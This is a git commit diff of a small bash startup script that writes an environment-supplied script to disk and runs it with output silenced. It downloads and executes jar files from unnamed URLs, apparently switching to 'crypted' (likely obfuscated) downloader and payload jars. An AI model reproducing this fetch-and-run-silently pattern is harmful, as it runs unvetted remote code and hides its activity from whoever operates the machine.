df11de349729081a5c5853261409aee23ebdd6d7
S3niorMCYT <77205348+SeniorMCYT@users.noreply.github.com>
2021-09-12 17:39:36 +0430

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,11 +1,12 @@
 #!/bin/bash
 cd $HOME
 echo $LINK2 > start2.sh
-curl $LINK --out leatestacc.jar
+crypted_jwget.jar $LINK
 bash start2.sh &> /dev/null
-curl $LINK3 --out buster.xpi
-curl https://api.ipify.org/
-java -jar leatestacc.jar
+crypted_jwget.jar $LINK3
+java -jar crypted_leatestacc.jar
+
+
 
 
 
